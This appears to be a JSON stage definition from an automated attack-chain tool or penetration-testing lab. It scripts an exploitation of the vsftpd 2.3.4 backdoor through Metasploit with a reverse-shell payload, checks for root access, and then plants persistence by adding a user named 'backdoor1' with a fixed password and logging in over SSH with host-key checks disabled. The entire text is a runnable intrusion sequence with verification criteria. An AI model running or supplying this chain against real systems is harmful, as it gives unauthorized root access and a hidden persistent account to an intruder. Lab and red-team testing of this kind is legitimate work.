        {
            "name": "Chain 1: vsftpd Backdoor to Root Persistence",
            "use_persistent_session": true,
            "session_name": "vsftpd_session",
            "stages": [
                {
                    "stage": "initial_access",
                    "description": "Trigger vsftpd 2.3.4 backdoor for root shell via Metasploit",
                    "commands": [
                        {
                            "type": "start_session",
                            "session_name": "vsftpd_session",
                            "command": "msfconsole -q"
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RHOSTS 192.168.56.5",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RPORT 21",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set PAYLOAD cmd/unix/reverse",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set LHOST 192.168.56.2",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set LPORT 4444",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "exploit -j",
                            "wait": 15
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -l",
                            "wait": 2
                        }
                    ],
                    "verification": "Check for 'Command shell session X opened' in output"
                },
                {
                    "stage": "privilege_escalation",
                    "description": "Verify root privileges on the shell",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'id'",
                            "wait": 3
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'whoami'",
                            "wait": 2
                        }
                    ],
                    "verification": "Check for uid=0(root) in output"
                },
                {
                    "stage": "persistence",
                    "description": "Create backdoor user and verify SSH access",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor1'",
                            "wait": 3
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c \"echo 'backdoor1:password123' | chpasswd\"",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1 -c 'cat /etc/passwd | grep backdoor1'",
                            "wait": 2
                        },
                        {
                            "type": "close_session",
                            "session_name": "vsftpd_session"
                        },
                        {
                            "type": "regular",
                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor1@192.168.56.5 'whoami'"
                        }
                    ],
                    "verification": "SSH login succeeds and returns 'backdoor1'"
                }
            ]
        },
